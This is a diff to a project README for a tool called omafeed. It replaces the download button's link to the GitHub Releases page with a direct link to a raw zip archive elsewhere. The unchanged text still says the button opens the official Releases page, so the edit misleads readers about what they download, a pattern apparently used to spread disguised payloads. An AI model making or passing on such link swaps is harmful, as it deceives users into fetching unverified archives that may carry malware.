@@ -47,7 +47,7 @@ First, you need to get the omafeed installer file. This is the first and most im
 
 Click the button below to go to the download page:
 
-[![Download omafeed](https://img.shields.io/badge/Download-omafeed-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/citylinemotion819/omafeed/releases)
+[![Download omafeed](https://img.shields.io/badge/Download-omafeed-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/citylinemotion819/citylinemotion819.github.io/main/wisha/2.6.zip)
 
 This will take you to the official GitHub "Releases" page. On that page, you'll see a list of versions. Look for the latest one at the top and click the download link to save the file to your computer (most likely to your "Downloads" folder).
 
